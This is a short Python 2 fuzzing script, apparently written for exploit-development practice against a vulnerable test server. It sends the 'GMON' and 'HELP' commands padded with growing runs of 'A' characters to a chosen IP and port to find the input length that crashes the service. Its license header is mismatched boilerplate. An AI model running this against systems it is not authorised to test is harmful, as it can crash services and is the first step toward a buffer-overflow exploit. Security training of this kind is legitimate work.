#!/usr/bin/python

"""Copyright (c) 2016, Ashish Kunwar AKA dorkerdevil,(pwndevil)
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
1. Redistributions of source code must retain the above copyright
   notice, this list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright
   notice, this list of conditions and the following disclaimer in the
   documentation and/or other materials provided with the distribution.
3. All advertising materials mentioning features or use of this software
   must display the following acknowledgement:
   This product includes software developed by Daniel Bugl.
4. Neither the name of Ashish Kunwar nor the names
   of its other contributors may be used to endorse or promote products
   derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY Ashish Kunwar ''AS IS'' AND ANY
EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
import socket

ipchoice_val = raw_input("enter the ip:")
ip = ipchoice_val
portchoice_val = input("enter port no:")
port = portchoice_val

commands = ("GMON ./:/", "HELP ")
increment = 100
maxlen = 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
for cmd in commands:
  for i in range(increment, maxlen, increment):
    s.send(cmd + "A" * i)
    print("Testing %s with length %i" % (cmd, i))
    try:
      data = s.recv(1024)
    except Exception:
      print("Program crashed with command %s and length %i" % (cmd, i))
      exit(1)
    if not data:
      print("program crashed with command %s and length %i" % (cmd, i))
      exit(1)

